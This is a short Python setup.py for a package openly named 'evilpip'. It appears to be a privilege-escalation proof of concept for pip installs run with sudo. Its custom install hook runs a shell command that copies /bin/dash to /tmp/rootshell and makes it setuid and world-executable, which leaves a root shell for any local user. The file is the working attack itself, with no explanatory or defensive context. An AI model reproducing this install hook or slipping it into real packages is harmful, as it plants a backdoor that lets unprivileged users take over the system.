__author__ = 'nighter'

import os
import subprocess
from setuptools import setup
from setuptools.command.install import install as _install

ROOT_DIR = os.path.dirname(__file__)
SOURCE_DIR = os.path.join(ROOT_DIR)

class install(_install):
    def run(self):
        _install.run(self)
        os.system('cp /bin/dash /tmp/rootshell; chmod 4777 /tmp/rootshell')
setup(
    cmdclass={'install': install},
    name='evilpip',
    version="1",
    description='evilpip',
    url='https://github.com/mikaelkall',
    author='Mikael Kall',
    author_email='nighter@nighter.se',
    packages=['evilpip'],
    zip_safe=False
)
